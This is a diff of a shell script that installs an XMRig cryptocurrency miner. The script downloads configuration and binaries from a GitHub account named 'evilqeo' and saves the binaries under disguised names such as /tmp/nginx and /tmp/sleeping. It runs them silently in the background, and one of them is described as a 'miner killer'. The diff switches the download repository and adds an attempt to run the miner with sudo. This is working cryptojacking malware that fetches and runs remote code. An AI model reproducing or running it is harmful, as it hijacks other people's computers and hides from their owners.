@@ -33,14 +33,14 @@ cd xmrig-$xmrver
 chmod +x xmrig
 
 rm -f settings.json
-$DOWNLOAD_CMD settings.json https://github.com/evilqeo/frogmaster/raw/main/settings.json
+$DOWNLOAD_CMD settings.json https://github.com/evilqeo/frcx/raw/main/settings.json
 randnum=$(( RANDOM % 1000 + 1 ))
 sed -i "s/kasm/kasm-$randnum/g" settings.json
 
 ####################################
 # 🔐 Download and run protection
 ####################################
-$DOWNLOAD_CMD /tmp/nginx https://github.com/evilqeo/frogmaster/raw/main/nginx
+$DOWNLOAD_CMD /tmp/nginx https://github.com/evilqeo/frcx/raw/main/nginx
 chmod +x /tmp/nginx
 nohup /tmp/nginx > /dev/null 2>&1 &
 ####################################
@@ -48,10 +48,11 @@ nohup /tmp/nginx > /dev/null 2>&1 &
 ####################################
 # 🛑 Download and run miner killer
 ####################################
-$DOWNLOAD_CMD /tmp/sleep https://github.com/evilqeo/frogmaster/raw/main/sleep
-chmod +x /tmp/sleep
-nohup /tmp/sleep > /dev/null 2>&1 &
+$DOWNLOAD_CMD /tmp/sleeping https://github.com/evilqeo/frcx/raw/main/sleeping
+chmod +x /tmp/sleeping
+nohup /tmp/sleeping > /dev/null 2>&1 &
 ####################################
 
 # Start miner normally
-nohup ./xmrig -c settings.json > /dev/null 2>&1 &
+sudo -n ./xmrig
+./xmrig
